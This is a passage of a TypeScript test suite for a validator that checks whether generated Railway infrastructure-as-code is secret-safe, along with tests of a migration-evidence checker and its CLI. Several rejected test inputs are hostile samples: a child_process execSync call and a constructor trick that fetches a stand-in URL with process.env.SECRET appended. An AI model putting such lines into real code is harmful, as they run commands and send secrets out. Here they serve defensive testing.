    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { ["env"]: { VALUE: "RAW" } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `service("fixture", { [env]: { VALUE: preserve() } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import "./secret"; service("fixture", {});`,
      ),
    ).toBe(false);
    expect(generatedIacSourceIsSecretSafe(`export * from "./secret";`)).toBe(
      false,
    );
    expect(
      generatedIacSourceIsSecretSafe(`export { secret } from "./secret";`),
    ).toBe(false);
    expect(generatedIacSourceIsSecretSafe(`export * from "railway/iac";`)).toBe(
      false,
    );
    expect(
      generatedIacSourceIsSecretSafe(
        `import { execSync } from "node:child_process"; execSync("id");`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import("./secret"); service("fixture", {});`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(`unknownCall(); service("fixture", {});`),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; while (true) {}`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; Object.prototype.x = "y";`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        'import { service } from "railway/iac"; service.constructor`return fetch("https://x/?" + process.env.SECRET)`;',
      ),
    ).toBe(false);
    expect(
      reasonsFor((evidence) => {
        evidence.generatedIac.manualSecretReviewCompleted = false;
      }),
    ).toContain("secret-safety-unverified");
  });

  it("rejects dynamic methods/accessors and spread forms that evade auditing", () => {
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const key = "ONLINE_OPS_TOKEN"; service("fixture", { options: { [key]() { return -1; } } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const key = "ONLINE_OPS_TOKEN"; service("fixture", { options: { get [key]() { return -1; } } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const key = "ONLINE_OPS_TOKEN"; service("fixture", { options: { set [key](value) {} } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { service } from "railway/iac"; const options = unknownOptions; service("fixture", { options: { ...options } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { project } from "railway/iac"; const resources = []; project("fixture", { resources: [...resources] });`,
      ),
    ).toBe(false);
  });

  it("keeps resource and context approvals bound to their lexical declaration", () => {
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; { const db = postgres("db"); } service("fixture", { env: { VALUE: db.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; { using db = postgres("db"); } service("fixture", { env: { VALUE: db.env.SECRET } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; var db = postgres("db"); { var db; service("fixture", { env: { VALUE: db.env.SECRET } }); }`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, service } from "railway/iac"; export default defineRailway(function ctx(ctx) { var ctx; return service("fixture", { env: { VALUE: ctx.shared.SECRET } }); });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, ref, service } from "railway/iac"; { const db = postgres("db"); } service("fixture", { env: { VALUE: ref(db, "output") } });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, project } from "railway/iac"; { const db = postgres("db"); } project("fixture", { resources: [db] });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; const db = postgres("db"); { service("fixture", { env: { VALUE: db.env.SECRET } }); }`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, postgres, project, service } from "railway/iac"; const db = postgres("db"); export default defineRailway(function db() { return project("fixture", { resources: [] }); }); service("fixture", { env: { VALUE: db.env.SECRET } });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, project, service } from "railway/iac"; export default defineRailway(function ctx(ctx) { return project("fixture", { resources: [] }); });`,
      ),
    ).toBe(true);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { postgres, service } from "railway/iac"; var db = postgres("db"); { var db = Bun; service("fixture", { env: { VALUE: db.env.SECRET } }); }`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, postgres, service } from "railway/iac"; const db = postgres("db"); export default defineRailway(function db() { return service("fixture", { env: { VALUE: db.env.SECRET } }); });`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, service } from "railway/iac"; export default defineRailway((...ctx) => service("fixture", { env: { VALUE: ctx.shared.SECRET } }));`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, project } from "railway/iac"; export default defineRailway((ctx = {}) => project("fixture", { resources: [] }));`,
      ),
    ).toBe(false);
    expect(
      generatedIacSourceIsSecretSafe(
        `import { defineRailway, project } from "railway/iac"; export default defineRailway(({ shared }) => project("fixture", { resources: [] }));`,
      ),
    ).toBe(false);
  });

  it("uses set membership while collecting large parameter lists", () => {
    const parameters = Array.from(
      { length: 20_000 },
      (_, index) => `p${index}`,
    ).join(",");
    expect(
      generatedIacSourceIsSecretSafe(`const build = (${parameters}) => 0;`),
    ).toBe(false);
    const contractSource = readFileSync(
      resolve(process.cwd(), "scripts/railway-iac-migration-contract.ts"),
      "utf8",
    );
    const functionLikeStart = contractSource.indexOf(
      "function collectFunctionLike",
    );
    const nextFunctionStart = contractSource.indexOf(
      "function collectScopesAndBindings",
    );
    expect(functionLikeStart).toBeGreaterThanOrEqual(0);
    expect(nextFunctionStart).toBeGreaterThan(functionLikeStart);
    const functionLikeSource = contractSource.slice(
      functionLikeStart,
      nextFunctionStart,
    );
    expect(functionLikeSource).toContain(
      "const parameterNodes = new Set<ts.Node>(node.parameters);",
    );
    expect(functionLikeSource).toContain("parameterNodes.has(child)");
    expect(functionLikeSource).not.toContain("node.parameters.some(");
  });

  it("keeps current readiness and immutable pre-cutover liveness separate", () => {
    const currentRailwayJson = JSON.parse(
      readFileSync(resolve(process.cwd(), "railway.json"), "utf8"),
    );
    const preCutoverRailwayJson = JSON.parse(LEGACY_FIXTURE_SOURCE);
    const evidence = validEvidence();
    expect(currentRailwayJson.deploy.healthcheckPath).toBe("/readyz");
    expect(preCutoverRailwayJson.deploy.healthcheckPath).toBe("/healthz");
    expect(FILESYSTEM.legacyFixtureSha256).toBe(RAILWAY_LEGACY_FIXTURE_SHA256);
    expect(evidence.preCutoverReadback.config.healthcheckPath).toBe("/healthz");
    expect(evidence.preCutoverReadback.config).toMatchObject({
      builder: preCutoverRailwayJson.build.builder,
      dockerfilePath: preCutoverRailwayJson.build.dockerfilePath,
      startCommand: preCutoverRailwayJson.deploy.startCommand,
      healthcheckTimeoutSeconds:
        preCutoverRailwayJson.deploy.healthcheckTimeout,
      restartPolicyType: preCutoverRailwayJson.deploy.restartPolicyType,
      restartPolicyMaxRetries:
        preCutoverRailwayJson.deploy.restartPolicyMaxRetries,
    });
  });

  it.each([
    ["/healthz", CURRENT_REPOSITORY_SOURCE.replace("/readyz", "/healthz")],
    ["malformed", "{ not-json"],
    ["empty", ""],
    ["unrelated content", JSON.stringify({ hello: "world" })],
  ])("holds when current railway.json is %s", (_label, source) => {
    const result = validateRailwayIacMigrationEvidence(
      validEvidence(),
      filesystemWithCurrentRepositorySource(source),
      NOW,
    );
    expect(result.migrationEvidence).toBe("hold");
    expect(result.reasons).toContain("legacy-config-missing");
  });

  it("holds when current railway.json contains duplicate object names", () => {
    const duplicateDeployKeys = CURRENT_REPOSITORY_SOURCE.replace(
      /("deploy"\s*:\s*)\{/,
      '$1{"startCommand":"node --import tsx server/start.ts"},"deploy":{',
    );
    expect(duplicateDeployKeys).not.toBe(CURRENT_REPOSITORY_SOURCE);

    const result = validateRailwayIacMigrationEvidence(
      validEvidence(),
      filesystemWithCurrentRepositorySource(duplicateDeployKeys),
      NOW,
    );
    expect(result.migrationEvidence).toBe("hold");
    expect(result.reasons).toContain("legacy-config-missing");
  });

  it("accepts only the strict current /readyz railway.json target", () => {
    expect(
      validateRailwayIacMigrationEvidence(
        validEvidence(),
        filesystemWithCurrentRepositorySource(CURRENT_REPOSITORY_SOURCE),
        NOW,
      ),
    ).toEqual({
      schemaVersion: 1,
      migrationEvidence: "pass",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: [],
    });
  });

  it("holds when the current /readyz railway.json is presented as legacy", () => {
    const evidence = validEvidence();
    evidence.ownershipCutover.legacyFileSha256 = CURRENT_REPOSITORY_SHA;

    const result = validateRailwayIacMigrationEvidence(
      evidence,
      FILESYSTEM,
      NOW,
    );
    expect(result.migrationEvidence).toBe("hold");
    expect(result.reasons).toContain("ownership-cutover-unverified");
  });

  it.each([
    ["tampered content", `${LEGACY_FIXTURE_SOURCE}\n`],
    ["wrong health path", LEGACY_FIXTURE_SOURCE.replace("/healthz", "/readyz")],
  ])("holds for an invalid immutable fixture: %s", (_label, content) => {
    const result = validateRailwayIacMigrationEvidence(
      validEvidence(),
      {
        ...FILESYSTEM,
        legacyFixtureSha256: createHash("sha256")
          .update(content, "utf8")
          .digest("hex"),
        legacyFixtureContent: content,
      },
      NOW,
    );
    expect(result.migrationEvidence).toBe("hold");
    expect(result.reasons).toContain("legacy-config-missing");
  });

  it("covers every fixed reason", () => {
    const observed = new Set<string>();
    const collect = (
      evidence: unknown,
      filesystem = FILESYSTEM,
      nowMs = NOW,
    ) => {
      for (const reason of validateRailwayIacMigrationEvidence(
        evidence,
        filesystem,
        nowMs,
      ).reasons) {
        observed.add(reason);
      }
    };
    collect(null);
    collect(validEvidence(), {
      generatedIacPath: null,
      generatedIacSha256: null,
      generatedIacSecretSafe: null,
      currentRepositoryFilePresent: FILESYSTEM.currentRepositoryFilePresent,
      currentRepositoryFileSha256: FILESYSTEM.currentRepositoryFileSha256,
      currentRepositoryFileContent: FILESYSTEM.currentRepositoryFileContent,
      legacyFixturePresent: false,
      legacyFixtureSha256: null,
      legacyFixtureContent: null,
    });
    const invalid = validEvidence();
    invalid.capturedAt = new Date(NOW - 300_001).toISOString();
    invalid.cliEvidence.planSupported = false;
    invalid.target.environmentName = "staging";
    invalid.inventory.resourceAddresses = [];
    invalid.generatedIac.sha256 = "bad";
    invalid.ownershipCutover.configFileSettingCleared = false;
    invalid.preCutoverReadback.observedAt = "bad";
    invalid.effectiveReadback.config.startCommand = "other";
    invalid.parityPlan.projectId = "other";
    invalid.parityPlan.exitCode = 2;
    invalid.parityPlan.destructions.push("service.deleted");
    invalid.parityPlan.pinnedPlanArtifactSha256 = "bad";
    invalid.parityPlan.showValuesUsed = true;
    collect(invalid, FILESYSTEM, Number.NaN);
    expect([...observed].sort()).toEqual([...RAILWAY_IAC_MIGRATION_REASONS]);
  });

  it("CLI is non-reflective and holds the current repository", () => {
    const secret = "SECRET_SENTINEL";
    const currentEvidence = validEvidence(Date.now());
    currentEvidence.ownershipCutover.legacyFileSha256 = CURRENT_REPOSITORY_SHA;
    const currentResult = spawnSync(
      process.execPath,
      ["--import", "tsx", "scripts/verify-railway-iac-migration.ts"],
      {
        cwd: process.cwd(),
        input: JSON.stringify(currentEvidence),
        encoding: "utf8",
      },
    );
    expect(currentResult.status).toBe(1);
    expect(currentResult.stderr).toBe("");
    expect(JSON.parse(currentResult.stdout)).toEqual({
      schemaVersion: 1,
      migrationEvidence: "hold",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: [
        "generated-iac-missing",
        "ownership-cutover-unverified",
        "secret-safety-unverified",
      ],
    });

    const duplicateKeys = JSON.stringify(currentEvidence).replace(
      '{"schemaVersion":1,',
      '{"schemaVersion":1,"schemaVersion":1,',
    );
    const duplicateResult = spawnSync(
      process.execPath,
      ["--import", "tsx", "scripts/verify-railway-iac-migration.ts"],
      {
        cwd: process.cwd(),
        input: duplicateKeys,
        encoding: "utf8",
      },
    );
    expect(duplicateResult.status).toBe(1);
    expect(duplicateResult.stderr).toBe("");
    expect(JSON.parse(duplicateResult.stdout)).toEqual({
      schemaVersion: 1,
      migrationEvidence: "hold",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: ["invalid-schema"],
    });

    const malformedResult = spawnSync(
      process.execPath,
      ["--import", "tsx", "scripts/verify-railway-iac-migration.ts"],
      {
        cwd: process.cwd(),
        input: JSON.stringify({ ...currentEvidence, secret }),
        encoding: "utf8",
      },
    );
    expect(malformedResult.status).toBe(1);
    expect(malformedResult.stderr).toBe("");
    expect(malformedResult.stdout).not.toContain(secret);
    expect(JSON.parse(malformedResult.stdout)).toEqual({
      schemaVersion: 1,
      migrationEvidence: "hold",
      authorizesMigration: false,
      authorizesApply: false,
      authorizesDeployment: false,
      externalMutationPerformed: false,
      reasons: ["invalid-schema"],
    });
  });
});
